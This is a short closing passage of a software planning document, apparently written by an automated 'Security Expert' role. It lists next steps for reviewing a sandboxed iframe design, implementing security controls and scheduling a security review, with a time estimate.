- WCAG 2.2 AA: https://www.w3.org/WAI/WCAG22/quickref/

---

**PHASE_COMPLETE: planning**

**Next Steps**:
1. Architecture team: Review and approve sandboxed iframe design
2. Senior Dev team: Begin Phase 1 implementation (CRITICAL security controls)
3. PM: Schedule security review meeting before sprint kickoff
4. Security Expert: Available for code review during implementation phase

**Estimated Total Security Implementation Time**: 10-11 developer days (across 2 sprints)

**Security Expert Status**: Ready to support implementation and code review phases.
